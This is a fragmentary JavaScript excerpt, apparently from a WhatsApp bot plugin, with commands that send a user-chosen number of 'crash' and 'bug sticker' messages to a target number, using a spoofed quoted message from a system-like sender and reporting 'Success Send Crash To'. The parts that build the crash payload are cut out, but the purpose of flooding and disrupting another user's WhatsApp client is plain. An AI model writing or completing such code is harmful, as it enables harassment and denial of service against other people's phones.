...
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© 𝑨𝒓𝒊𝒇𝒛𝒚𝒏`,jpegThumbnail: miku}}}
...
m.reply(`Success Send Crash To: ${num}\nAmount Spam: ${jumlah}`)
}
...
if (command == 'sendstick') {
if (!args[0]) return m.reply(`Penggunaan ${usedPrefix+command} jumlah\nContoh ${usedPrefix+command} 5`)
const num = args[0].split('|')[0]
const jumlah = args[0].split('|')[1]
for (let i = 0; i < jumlah; i++) {
var sticker = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
...
m.reply(`Success send bug sticker to: ${num}\nAmount Spam: ${jumlah}`)
}
